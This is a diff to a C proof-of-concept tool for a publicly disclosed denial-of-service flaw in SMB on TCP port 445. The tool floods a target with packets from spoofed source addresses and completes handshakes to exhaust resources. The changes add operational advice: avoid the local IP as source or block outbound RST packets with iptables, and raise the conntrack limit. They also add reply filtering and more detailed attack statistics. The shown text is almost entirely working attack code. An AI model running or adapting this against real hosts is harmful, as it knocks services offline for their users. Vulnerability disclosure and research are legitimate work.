@@ -6,6 +6,10 @@
  *
  * This is a proof of concept of a publicly disclosed vulnerability.
  * Please do not go around randomly DoSing people with it.
+ *
+ * Tips: do not use your local IP as source, or if you do, use iptables to block
+ * outbound RST packets. You may want to increase your local conntrack limit:
+ *   echo 1200000 > /proc/sys/net/netfilter/nf_conntrack_max
  */
 
 #include <stdio.h>
@@ -112,7 +116,7 @@ void send_arp(uint32_t addr)
     close(sock);
 }
 
-int sent_packets = 0, errors = 0, replies = 0;
+int sent_packets = 0, errors = 0, replies = 0, rsts = 0, last_errno = 0;
 
 void process_replies(int sock, int rsock)
 {
@@ -134,6 +138,12 @@ void process_replies(int sock, int rsock)
             ntohl(reply.ip.daddr) > cfg.src_max)
             continue;
         if (reply.ip.protocol != IPPROTO_TCP || reply.tcp.source != htons(445))
+            continue;
+        if (reply.tcp.rst || reply.tcp.fin) {
+            rsts++;
+            continue;
+        }
+        if (!reply.tcp.ack || !reply.tcp.syn)
             continue;
 
         struct {
@@ -166,6 +176,7 @@ void process_replies(int sock, int rsock)
         ret = sendto(sock, &pkt, sizeof pkt, 0, (struct sockaddr*)&cfg.dst_sa, sizeof(cfg.dst_sa));
         if (ret < 0) {
             errors++;
+            last_errno = errno;
         } else {
             replies++;
         }
@@ -233,10 +244,11 @@ int main(int argc, char **argv)
             int ret = sendto(sock, &pkt, sizeof pkt, 0, (struct sockaddr*)&cfg.dst_sa, sizeof(cfg.dst_sa));
             if (ret < 0) {
                 errors++;
+                last_errno = errno;
             }
             sent_packets++;
             if (sent_packets % 100 == 0) {
-                fprintf(stderr, "\r%d sent, %d errors, %d replies", sent_packets, errors, replies);
+                fprintf(stderr, "\r%08x:%02x %d sent, %d errors (%d), %d replies, %d resets", src, port, sent_packets, errors, last_errno, replies, rsts);
                 send_arp(src);
             }
             process_replies(sock, rsock);
